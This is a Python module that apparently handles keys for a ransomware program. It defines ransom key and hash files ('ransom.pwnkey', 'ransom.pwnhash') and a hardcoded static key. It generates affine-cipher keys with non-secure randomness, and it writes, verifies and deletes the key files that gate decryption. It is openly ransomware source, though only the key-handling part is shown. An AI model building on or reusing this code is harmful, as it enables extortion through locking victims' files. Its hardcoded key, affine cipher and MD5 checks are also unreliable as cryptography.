import hashlib

import os
import random

from cipher import cryptomath
from file_util import put_file, get_file

STATIC_KEY = "6l72xhpwZ9P3RjTHUi8vuq2hHP0dlaSz"

SYMBOLS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

KEY_FILE = "ransom.pwnkey"

KEY_HASH_FILE = "ransom.pwnhash"


def get_md5(string):
    md5 = hashlib.md5()
    md5.update(string)

    return md5


def create_key():
    return Key(STATIC_KEY)


def get_random_key():
    while True:
        key_a = random.randint(2, len(SYMBOLS))
        key_b = random.randint(2, len(SYMBOLS))
        if cryptomath.gcd(key_a, len(SYMBOLS)) == 1:
            return key_a * len(SYMBOLS) + key_b


def get_key_file(root_dir):
    key_file_path = os.path.join(root_dir, KEY_FILE)
    hash_file_path = os.path.join(root_dir, KEY_HASH_FILE)

    if not os.path.exists(key_file_path):
        raise Exception('No key file found, cannot decrypt.')

    if not os.path.exists(hash_file_path):
        raise Exception('No hash file found, cannot decrypt.')

    key = Key(get_file(key_file_path))
    stored_hash = get_file(hash_file_path)

    if key.md5 != stored_hash:
        raise Exception('Incorrect key, cannot decrypt.')

    os.remove(key_file_path)
    os.remove(hash_file_path)

    return key


def export_key_file(root_dir, key):
    put_file(os.path.join(root_dir, KEY_FILE), key.string)
    put_file(os.path.join(root_dir, KEY_HASH_FILE), key.md5)


class Key:

    def __init__(self, string):
        self.string = string
        self.ints = map(ord, string)
        self.md5 = get_md5(string).hexdigest()
